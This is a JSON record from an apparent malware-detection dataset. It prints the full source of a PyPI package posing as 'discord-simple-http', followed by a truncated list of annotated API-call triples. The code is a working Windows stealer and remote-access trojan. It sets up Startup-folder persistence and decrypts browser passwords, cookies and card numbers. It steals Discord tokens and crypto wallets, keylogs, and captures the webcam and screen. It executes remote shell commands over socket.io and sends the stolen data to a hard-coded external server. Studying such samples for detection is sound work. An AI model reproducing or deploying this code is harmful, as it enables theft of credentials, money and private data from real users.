{
  "metadata": {
    "package_name": "discord-simple-http-1.7.4",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/discord-simple-http-1.7.4.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/discord-simple-http-1.7.4.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport sys\nimport shutil\nimport socketio\nimport base64\nimport platform\nimport requests\nimport sqlite3\nimport json\nimport random\nimport string\nimport re\nimport time\nimport threading\nimport cv2\nimport zipfile\nimport ctypes\nimport webbrowser\nimport keyboard\nfrom win32crypt import CryptUnprotectData\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\n\nsio = socketio.Client()\nwapned_path = os.getenv(\"temp\") + \"/\"\nrandom_name = lambda x: ''.join([random.choice(list(string.ascii_letters)) for _ in range(x)])\nappdata = os.getenv('LOCALAPPDATA')\nroaming = os.getenv(\"appdata\")\non = False\n\nclass Startup:\n    def __init__(self) -> None:\n        self.filename = sys.argv[0]\n        self.path = f\"C:/Users/{os.getenv('username')}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/bit64start.{self.filename.split('.')[-1]}\"\n        if not os.path.exists(self.path):\n            shutil.copy(\n                self.filename,\n                self.path)\n\nclass Browser:\n    def __init__(self, name, path) -> None:\n        self.path = path\n        self.name = name\n        self.profiles = [\n            '/Default',\n            '/Profile 1',\n            '/Profile 2',\n            '/Profile 3',\n            '/Profile 4',\n            '/Profile 5',\n            ]\n        self.profiles = [profile for profile in self.profiles if os.path.exists(path + profile)]\n        information['browsers'][self.name]={}\n        self.master_key = self.get_master_key()\n    \n    def get_master_key(self) -> bytes:\n        with open(os.path.join(self.path, \"Local State\"), \"r\", encoding=\"utf-8\") as f:\n            local_state = json.load(f)\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n\n    def decrypt(self, buff: bytes) -> str:\n        iv, payload = buff[3:15], buff[15:]\n        cipher = AES.new(self.master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)[:-16].decode()\n        return decrypted_pass\n\n    def create_temporal_db(self, db) -> str:\n        if os.path.exists(db):\n            copy_path = wapned_path + random_name(10)\n            try:\n                print(copy_path)\n                shutil.copy(db, copy_path)\n            except Exception as e:\n                print(e)\n                return False\n            return copy_path\n        else:\n            return False\n\n    def cards(self) -> None:\n        for profile in self.profiles:\n            original_db = self.path + profile + \"/Web Data\"\n            temporal_db = self.create_temporal_db(original_db)\n            \n            if not temporal_db: return\n            conn = sqlite3.connect(temporal_db)\n            cursor = conn.cursor()\n            cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')\n\n            cards = [\n                {\n                \"name\":info[0],\n                \"month\":info[1],\n                \"year\":info[2],\n                \"number\":self.decrypt(info[3]),\n                \"date_modified\":info[4]\n                }for info in cursor.fetchall()\n                if info[0] or info[1] or info[2] or info[3]\n            ]\n            \n            information['browsers'][self.name]['cards']=cards\n            conn.close()\n            os.remove(temporal_db)\n            return cards\n        \n    def passwords(self) -> None:\n        for profile in self.profiles:\n            original_db = self.path + profile + \"/Login Data\"\n            temporal_db = self.create_temporal_db(original_db)\n            if not temporal_db: return\n            \n            conn = sqlite3.connect(temporal_db)\n            cursor = conn.cursor()\n            cursor.execute('SELECT action_url, username_value, password_value FROM logins')\n\n            passwords = [\n                {\n                \"url\":info[0],\n                \"username\":info[1],\n                \"password\":self.decrypt(info[2])\n                }for info in cursor.fetchall()\n                if info[2]\n            ]\n            information['browsers'][self.name]['passwords'] = passwords\n            information['passwords'] = information['passwords'] + passwords\n            conn.close()\n            os.remove(temporal_db)\n            return passwords\n\n    def history(self) -> None:\n        for profile in self.profiles:\n            original_db = self.path + profile + f\"/History\"\n            \n            temporal_db = self.create_temporal_db(original_db)\n            if not temporal_db: return\n            \n            conn = sqlite3.connect(temporal_db)\n            cursor = conn.cursor()\n            cursor.execute('SELECT url, title, last_visit_time FROM urls')\n\n            history = [\n                {\n                \"url\":info[0],\n                \"title\":info[1],\n                \"timestamp\":info[2]\n                }for info in cursor.fetchall()[0:1500]\n                if info[0] and info[1] and info[2]\n            ]\n            information['browsers'][self.name]['web-history']=history\n            conn.close()\n            os.remove(temporal_db)\n            return history\n\n    def cookies(\n        self\n        ) -> None:\n        for profile in self.profiles:\n            original_db = self.path + profile + f\"/Network/Cookies\"\n            temporal_db = self.create_temporal_db(\n                original_db\n                )\n            if not temporal_db:\n                return\n            \n            conn = sqlite3.connect(\n                temporal_db\n            )\n            cursor = conn.cursor()\n            cursor.execute(\n                'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies'\n            )\n            \n            cookies = [\n                {\n                \"url\":info[0],\n                \"expires\":info[1],\n                \"path\":info[2],\n                \"name\":self.decrypt(info[3]),\n                \"value\":info[4]\n                }\n                for info in cursor.fetchall()\n                if info[0] and info[1] and info[2] and info[3] and info[4]\n            ]\n            information[\"browsers\"][self.name][\"cookies\"] = cookies\n            information['cookies'] = information['cookies'] + cookies\n            conn.close()\n            os.remove(\n                temporal_db\n            )\n            return cookies\n\nclass GrabbBrowsers:\n    def __init__(\n        self\n        ) -> None:\n        self.browsers = {\n            'epic-privacy-browser': f'{appdata}/Epic Privacy Browser/User Data',\n            'google-chrome-sxs': f'{appdata}/Google/Chrome SxS/User Data',\n            'brave': f'{appdata}/BraveSoftware/Brave-Browser/User Data',\n            'microsoft-edge': f'{appdata}/Microsoft/Edge/User Data',\n            'google-chrome': f'{appdata}/Google/Chrome/User Data',\n            'yandex': f'{appdata}/Yandex/YandexBrowser/User Data',\n            'cent-browser': f'{appdata}/CentBrowser/User Data',\n            'sputnik': f'{appdata}/Sputnik/Sputnik/User Data',\n            'uran': f'{appdata}/uCozMedia/Uran/User Data',\n            '7star': f'{appdata}/7Star/7Star/User Data',\n            'orbitum': f'{appdata}/Orbitum/User Data',\n            'vivaldi': f'{appdata}/Vivaldi/User Data',\n            'iridium': f'{appdata}/Iridium/User Data',\n            'kometa': f'{appdata}/Kometa/User Data',\n            'amigo': f'{appdata}/Amigo/User Data',\n            'torch': f'{appdata}/Torch/User Data',\n        }\n    \n    def start(\n        self,\n        option: str,\n        ) -> None:\n        content = []\n        for name, path in self.browsers.items():\n            if os.path.exists(path):\n                BrowserObject = Browser(\n                    name,\n                    path\n                )\n                if option == 'cookies':\n                    a = BrowserObject.cookies()\n                    if isinstance(a, list):\n                        content = content + a\n                elif option == 'passwords':\n                    a = BrowserObject.passwords()\n                    if isinstance(a, list):\n                        content = content + a\n                elif option == 'cards':\n                    a = BrowserObject.cards()\n                    if isinstance(a, list):\n                        content = content + a\n                elif option == 'history':\n                    a = BrowserObject.history()\n                    if isinstance(a, list):\n                        content = content + a\n                elif option == 'all':\n                    for operation in [\n                        BrowserObject.cookies,\n                        BrowserObject.passwords,\n                        BrowserObject.cards,\n                        BrowserObject.history,]:\n                        try:\n                            operation()\n                        except:\n                            pass\n\n        return content\n\nclass GetTokens:\n    def __init__(self):\n        self.paths = {\n        'Discord': f'{roaming}/discord/Local Storage/leveldb/',\n        'Discord Canary': f'{roaming}/discordcanary/Local Storage/leveldb/',\n        'Lightcord': f'{roaming}/Lightcord/Local Storage/leveldb/',\n        'Discord PTB': f'{roaming}/discordptb/Local Storage/leveldb/',\n        'Opera': f'{roaming}/Opera Software/Opera Stable/Local Storage/leveldb/',\n        'Opera GX': f'{roaming}/Opera Software/Opera GX Stable/Local Storage/leveldb/',\n        'Amigo': f'{appdata}/Amigo/User Data/Local Storage/leveldb/',\n        'Torch': f'{appdata}/Torch/User Data/Local Storage/leveldb/',\n        'Kometa': f'{appdata}/Kometa/User Data/Local Storage/leveldb/',\n        'Orbitum': f'{appdata}/Orbitum/User Data/Local Storage/leveldb/',\n        'CentBrowser': f'{appdata}/CentBrowser/User Data/Local Storage/leveldb/',\n        '7Star': f'{appdata}/7Star/7Star/User Data/Local Storage/leveldb/',\n        'Sputnik': f'{appdata}/Sputnik/Sputnik/User Data/Local Storage/leveldb/',\n        'Vivaldi': f'{appdata}/Vivaldi/User Data/Default/Local Storage/leveldb/',\n        'Chrome SxS': f'{appdata}/Google/Chrome SxS/User Data/Local Storage/leveldb/',\n        'Chrome': f'{appdata}/Google/Chrome/User Data/Default/Local Storage/leveldb/',\n        'Chrome1': f'{appdata}/Google/Chrome/User Data/Profile 1/Local Storage/leveldb/',\n        'Chrome2': f'{appdata}/Google/Chrome/User Data/Profile 2/Local Storage/leveldb/',\n        'Chrome3': f'{appdata}/Google/Chrome/User Data/Profile 3/Local Storage/leveldb/',\n        'Chrome4': f'{appdata}/Google/Chrome/User Data/Profile 4/Local Storage/leveldb/',\n        'Chrome5': f'{appdata}/Google/Chrome/User Data/Profile 5/Local Storage/leveldb/',\n        'Epic Privacy Browser': f'{appdata}/Epic Privacy Browser/User Data/Local Storage/leveldb/',\n        'Microsoft Edge': f'{appdata}/Microsoft/Edge/User Data/Defaul/Local Storage/leveldb/',\n        'Uran': f'{appdata}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb/',\n        'Yandex': f'{appdata}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/',\n        'Brave': f'{appdata}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/',\n        'Iridium': f'{appdata}/Iridium/User Data/Default/Local Storage/leveldb/'\n    }\n        self.regexp = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\"\n        self.regexp_enc = r\"dQw4w9WgXcQ:[^\\\"]*\"\n        self.tokens = []\n    \n    def start(self) -> None:\n        for name, path in self.paths.items():\n            if os.path.exists(path):\n                if \"cord\" in name:\n                    self.get_discord(name, path)\n                else:\n                    self.get_browser(name, path)\n        self.get_firefox()\n            \n    def get_master_key(self, path: str) -> bytes:\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n    \n    def decrypt_data(self, buff: bytes, master_key: bytes) -> str:\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\n\n    def get_discord(self, name, path) -> None:\n        localstate = roaming+f'/{name.replace(\" \", \"\").lower()}/Local State'\n        if os.path.exists(localstate):\n            for filename in [filename for filename in os.listdir(path) if filename.split(\".\")[-1] in [\"log\", \"ldb\"]]:\n                for line in [x.strip() for x in open(f'{path}/{filename}', errors='ignore').readlines() if x.strip()]:\n                    for y in re.findall(self.regexp_enc, line):\n                        master_key = self.get_master_key(localstate)\n                        encrypted = base64.b64decode(y.split('dQw4w9WgXcQ:')[1])\n                        token = self.decrypt_data(encrypted, master_key)\n                        Token(token)\n    \n    def get_browser(self, name, path) -> None:\n        for filename in [filename for filename in os.listdir(path) if filename.split(\".\")[-1] in [\"log\", \"ldb\"]]:\n            for line in [x.strip() for x in open(f'{path}/{filename}', errors='ignore').readlines() if x.strip()]:\n                for token in re.findall(self.regexp, line):\n                    Token(token)\n\n    def get_firefox(self) -> None:\n        if os.path.exists(roaming+\"/Mozilla/Firefox/Profiles\"):\n            for path, _, files in os.walk(roaming+\"/Mozilla/Firefox/Profiles\"):\n                for file in [file for file in files if file.endswith('.sqlite')]:\n                    for line in [x.strip() for x in open(f'{path}/{file}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regexp, line):\n                            Token(token)\n\nclass Token:\n    def __init__(self, token: str) -> None:\n        self.token = token\n        self.check()\n\n    def check(self) -> None:\n        if not self.token in information['tokens']:\n            information['tokens'].append(self.token)\n\nclass Grabb:\n    def __init__(self) -> None:\n        pass\n    \n    def getInformation(self) -> dict:\n        information = {}\n        try:\n            hwid = os.popen('wmic csproduct get uuid').read().split('\\n')[1].strip()\n        except:\n            hwid = \"None\"\n        ip_adress = requests.get('https://api.ipify.org').text\n        username = os.getenv(\"UserName\") \n        computername = os.getenv(\"COMPUTERNAME\")\n        information[\"hwid\"]=hwid\n        information['username']=username\n        information['computername']=computername\n        information[\"os\"]=platform.system() + \" \" + platform.version()\n        information[\"ipv4\"]=socket.gethostbyname(\n            socket.gethostname()\n        )\n        information[\"ip\"]=ip_adress\n        information[\"machine\"]=platform.machine()\n        return information\n\n    def screenshot(self) -> str:\n        path = os.getenv('temp') + \"/\" + \"image.png\"\n        screenshot = ImageGrab.grab()\n        screenshot.save(path)\n        print(path)\n        return path\n    \n    def webcam(self) -> str:\n        cap = cv2.VideoCapture(0)\n        if not cap.isOpened():\n            return\n        ret, frame = cap.read()\n        if not ret:\n            return\n        filename = os.getenv('temp') + \"/\" + \"webcam-photo.png\"\n        cv2.imwrite(filename, frame)\n        cap.release()\n        return filename\n\nclass FileMagnament:\n    def __init__(\n        self\n        ) -> None:\n        self.globals = [\n            os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\n            os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\n            os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\n            os.path.join(os.path.expanduser(\"~\"), \"OneDrive\"),\n            os.path.join(os.path.expanduser(\"~\"), \"Videos\"),\n        ]\n        self.files = {}\n    \n    @staticmethod\n    def convertPathToZip(\n        name: str,\n        path: str\n        ) -> None:\n        if os.path.exists(path):\n            zip_name = wapned_path + name.replace(\" \", \"\") + \".zip\"\n            os.chdir(path)\n            if len(os.listdir(path)) > 0:\n                with zipfile.ZipFile(zip_name, \"w\") as f:\n                    for file in os.listdir(path):\n                        f.write(file)\n            return zip_name\n\n    def basicGrb(\n        self,\n        wallets=False,\n        relevant=False,\n        read=True,\n        ) -> dict:\n        if wallets==True:\n            self.paths = {\n                \"Atomic LevelDB\": f\"{roaming}/atomic/Local Storage/leveldb\",\n                \"Exodus Wallet\": f\"{roaming}/Exodus/exodus.wallet\",\n                \"Exodus Wallet LevelDB\": f\"{roaming}/Exodus/Local Storage/leveldb\",\n                \"Atomic Wallet\": f\"{roaming}/AtomicWallet/Local Storage/leveldb\",\n                \"Electrum Wallet\": f\"{roaming}/Electrum/wallets/leveldb\",\n                \"Bitcoin Core\": f\"{roaming}/Bitcoin/Core/leveldb\",\n                \"Litecoin Core\": f\"{roaming}/Litecoin/Core/leveldb\",\n                \"Ethereum (Geth)\": f\"{roaming}/Ethereum/geth/leveldb\",\n                \"Ethereum (Parity)\": f\"{roaming}/Ethereum/paritydb/leveldb\",\n                \"Monero\": f\"{roaming}/Monero/lmdb/leveldb\",\n                \"Dash Core\": f\"{roaming}/DashCore/blocks/index/leveldb\",\n            }\n        elif relevant==True:\n            self.paths = {\n                \"Epic Games LevelDB\": f\"{roaming}/Epic Games/UnrealEngineLauncher/Launcher/storage/assets/DataStore/filecache/*\",\n                \"Steam LevelDB\": f\"{roaming}/Steam/config/*/localconfig.vdf\",\n                \"Rockstar Games LevelDB\": f\"{roaming}/Rockstar Games/Social Club/Databases/*\",\n                \"Ubisoft LevelDB\": f\"{roaming}/Ubisoft/Ubisoft Game Launcher/cache/core/*\",\n                \"Origin LevelDB\": f\"{roaming}/Origin/LocalContent/EAD4*/cache/*\",\n                \"GOG.com LevelDB\": f\"{roaming}/GOG.com/Galaxy/storage/cache/*\",\n                \"Rave LevelDB\": f\"{roaming}/Rave/Local Storage/leveldb/\"\n            }\n        for name, path in self.paths.items():\n            zipfile = self.convertPathToZip(\n                name=name,\n                path=path\n            )\n            if zipfile != None:\n                if read:\n                    with open(zipfile, \"rb\") as f:\n                        file_data = f.read()\n                    self.files[zipfile.replace(wapned_path, \"\")]=file_data\n                else:\n                    self.files[zipfile.replace(wapned_path, \"\")]=open(zipfile, \"rb\")\n        return self.files\n\n    def searchFile(\n        self,\n        filename=None,\n        filenames=None,\n        path='C:/',\n        ) -> str | dict:\n        for act, dirs, files in os.walk(path):\n            for file in files:\n                if filename != None:\n                    if filename.lower() in file.lower():\n                        self.filesfiles.append(os.path.join(act, file))\n                else:\n                    for file_ in filenames:\n                        if file_.lower() in file.lower():\n                            self.files[random_name(5) + \"-\" + file]=open(os.path.join(act, file), \"rb\").read()\n                            break\n\n    def getBackupCodes(\n        self\n        ) -> dict:\n        for path in self.globals:\n            self.searchFile(\n                filenames=[\n                    \"backup_codes\",\n                    \"discord_backup\",\n                    \"discord_codes\",\n                ],\n                path=path\n            )\n        return self.files\n\nObj = Grabb()\n\non = False\nclass KeyLogger:\n    def __init__(\n        self\n        ):\n        self.data = []\n\n    def keylog_event(\n        self,\n        key\n        ) -> None:\n        if key.event_type == keyboard.KEY_DOWN:\n            self.data.append(key.name)\n            self.ultimatum = time.time()\n            print(f\"Tecla presionada: {key.name}\")\n\n    def start(\n        self\n        ) -> None:\n        global on\n        on = True\n        self.ultimatum = time.time()\n        keyboard.hook(self.keylog_event)\n        while on:\n            if self.ultimatum != None:\n                if (time.time() - self.ultimatum) > 5:\n                    self.ultimatum = None\n                    if len(self.data) > 100:\n                        self.send()\n        if not on:\n            keyboard.unhook_all()\n\n    def send(\n        self\n        ) -> None:\n        sio.emit('keylog-response', self.data)\n        self.data = []\n\n@sio.event\ndef connect():\n    sio.emit('join', user_id)\n    print('Conectado al servidor')\n\n@sio.on('command')\ndef command(cmd):\n    sio.emit('command-response', os.popen(cmd['cmd']).read())\n\n@sio.on('history')\ndef history():\n    sio.emit('history-response', GrabbBrowsers().start('history'))\n\n@sio.on('discord-tokens')\ndef tokens():\n    information['tokens']=[]\n    GetTokens().start()\n    time.sleep(5)\n    sio.emit('discord-tokens-response', information['tokens'])\n\n@sio.on('cards')\ndef cards():\n    sio.emit('cards-response', GrabbBrowsers().start('cards'))\n\n@sio.on('passwords')\ndef passwords():\n    sio.emit('passwords-response', GrabbBrowsers().start('passwords'))\n\n@sio.on('download')\ndef download(filename: str):\n    if os.path.exists(filename):\n        with open(filename, \"rb\") as f:\n            data = f.read()\n        sio.emit('download-response', {'file.' + filename.split('.')[-1]: data})\n    else:\n        sio.emit('download-response', False)\n\n@sio.on('backup-codes')\ndef getBackupCodes():\n    sio.emit('backup-codes-response', FileMagnament().getBackupCodes())\n\n@sio.on('cookies')\ndef cookies():\n    sio.emit('cookies-response', GrabbBrowsers().start('cookies'))\n\n@sio.on('browsers')\ndef browsers():\n    GrabbBrowsers().start('all',)\n    sio.emit('browsers-response', information['browsers'])\n\n@sio.on('website')\ndef website(url: str):\n    try:\n        webbrowser.open(url)\n        sio.emit('website-response', True)\n    except:\n        sio.emit('website-response', False)\n\n@sio.on('upload')\ndef upload(args: dict):\n    try:\n        response = requests.get(args['url'])\n        if response.status_code == 200:\n            with open(args['path'], \"wb\") as f:\n                f.write(response.content)\n            sio.emit('upload-response', True)\n        else:\n            sio.emit('upload-response', False)\n    except Exception as e:\n        sio.emit('upload-response', False)\n\n@sio.on('alert')\ndef upload(alert: str):\n    threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, alert, '#YeezyGvng & #WapnedGvng', 0x10,)).start()\n    sio.emit('alert-response', True)\n\n@sio.on('wallets')\ndef wallets():\n    sio.emit('wallets-response', FileMagnament().basicGrb(wallets=True))\n\n@sio.on('gamestores')\ndef wallets():\n    sio.emit('gamestores-response', FileMagnament().basicGrb(relevant=True))\n\n@sio.on('screenshot')\ndef screenshot():\n    with open(Obj.screenshot(), 'rb') as image_file:\n        image_data = image_file.read()\n        sio.emit('screenshot-response', image_data)\n\n@sio.on('webcam')\ndef screenshot():\n    file = Obj.webcam()\n    with open(file, 'rb') as image_file:\n        image_data = image_file.read()\n        sio.emit('webcam-response', image_data)\n\n@sio.on('ip')\ndef screenshot():\n    sio.emit('ip-response', requests.get('https://api.ipify.org').text)\n\n@sio.on('website')\ndef screenshot(url: str):\n    sio.emit('website-response', webbrowser.open(url=url))\n\n@sio.on('encrypt')\ndef encrypt(data):\n    file = data['path']\n    key = data['key']\n    sio.emit('encrypt-response', Encrypter(file, key).encryptFiles())\n\n@sio.on('decrypt')\ndef decrypt(data):\n    file = data['path']\n    key = data['key']\n    sio.emit('decrypt-response', Encrypter(file, key).decryptFiles())\n\n@sio.on('information')\ndef info():\n    sio.emit('information-response', Obj.getInformation())\n\n@sio.on('initkeylog')\ndef info(data: bool):\n    global on\n    global keylogthread\n    if data:\n        if not on:\n            keylogthread = threading.Thread(target=KeyLogger().start).start()\n            sio.emit('initkeylog-response', True)\n        else:\n            sio.emit('initkeylog-response', 101)\n    else:\n        on = False\n        try:\n            keylogthread.join()\n        except:\n            pass\n        sio.emit('initkeylog-response', False)\n\n@sio.on('listdir')\ndef listdir(path: str):\n    if os.path.exists(path):\n        sio.emit('listdir-response', {\"path\": path, \"files\":os.listdir(path)})\n    else:\n        sio.emit('listdir-response', False)\n\n@sio.event\ndef disconnect():\n    pass\n\ndef define_(\n    id_: str,\n    api_: str,\n    init=True,\n    ) -> None:\n    global user_id\n    user_id = id_\n    global api_url\n    api_url = api_\n    global information\n    if init:\n        Startup()\n        wallets_ = FileMagnament().basicGrb(wallets=True, read=False)\n        information = {\n            \"passwords\":[],\n            \"cookies\":[],\n            \"browsers\":{},\n            \"tokens\":[],\n            \"information\":Obj.getInformation(),\n            \"wallets\":[name for name, x in wallets_.items()],\n        }\n        GrabbBrowsers().start('all')\n        GetTokens().start()\n        r = requests.post(\n            url=f'{api_url}/api/{user_id}/',\n            json=information,\n        )\n        \n        r = requests.post(\n            url=f'{api_url}/api/{user_id}/wallets/',\n            files=wallets_,\n        )\n\n    information = {}\n\n    sio.connect(api_url)\n    try:\n        sio.wait()\n    except Exception as e:\n        print(e)\n    sio.disconnect()\n\napi = \"https://yeezy-api.onrender.com/\"\nuser_id = \"1166039508446351390\"\n\ndefine_(\n    user_id,\n    api,\n    False,\n)\n",
          "triple_sequences": [
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"temp\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'LOCALAPPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"appdata\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "sys.argv[0]",
              "action_description": "Retrieves command-line arguments passed to script",
              "action_id": "get_cmd_args",
              "object": "sys.argv[0]",
              "object_description": "Command-line arguments passed to script",
              "object_id": "get_cmd_args",
              "intention_description": "Access command line arguments",
              "intention_id": "access_command_line_arguments"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "self.path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "shutil.copy()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "self.filename, self.path",
              "object_description": "Local file or directory",
              "object_id": "local_file_or_directory",
              "intention_description": "Copy file to startup directory",
              "intention_id": "copy_file_startup_directory"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path + profile",
              "object_description": "Browser profile directory",
              "object_id": "browser_profile_directory",
              "intention_description": "Determine presence of browser profile",
              "intention_id": "determine_browser_profile_presence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "os.path.join(self.path, \"Local State\")",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Access browser local state file",
              "intention_id": "access_browser_local_state"
            },
            {
              "action_api": "json.load()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "f",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "local_state[\"os_crypt\"][\"encrypted_key\"]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode encrypted key",
              "intention_id": "decode_encrypted_key"
            },
            {
              "action_api": "CryptUnprotectData()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "master_key, None, None, None, 0",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "AES.new()",
              "action_description": "Initializes symmetric encryption with provided key",
              "action_id": "init_symmetric_encryption",
              "object": "self.master_key, AES.MODE_GCM, iv",
              "object_description": "Decryption key and initialization vector",
              "object_id": "decryption_key_iv",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "cipher.decrypt()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "payload",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode decrypted password",
              "intention_id": "decode_decrypted_password"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "db",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "shutil.copy()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "db, copy_path",
              "object_description": "Local file or directory",
              "object_id": "local_file_or_directory",
              "intention_description": "Copy database to temporary location",
              "intention_id": "copy_database_temp_location"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "temporal_db",
              "object_description": "SQLite database file",
              "object_id": "open_sqlite_db",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "conn.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards'",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query credit card data",
              "intention_id": "query_credit_card_data"
            },
            {
              "action_api": "cursor.fetchall()",
              "action_description": "Fetches all rows from last executed query",
              "action_id": "fetch_sql_rows",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract structured data from file",
              "intention_id": "extract_structured_file_data"
            },
            {
              "action_api": "conn.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "temporal_db",
              "object_description": "Temporary file path",
              "object_id": "temporary_file_path",
              "intention_description": "Delete temporary database",
              "intention_id": "delete_temporary_database"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "zipfile.ZipFile()",
              "action_description": "Opens ZIP archive for writing",
              "action_id": "open_zip_write",
              "object": "zip_name, \"w\"",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Create zip archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "f.write()",
              "action_description": "Adds file to ZIP archive with specified archive name",
              "action_id": "add_file_zip",
              "object": "file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Add file to zip archive",
              "intention_id": "add_file_to_archive"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "zipfile, \"rb\"",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Directory tree generation",
              "action_id": "path_special_operations",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "os.path.join(act, file), \"rb\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "os.popen()",
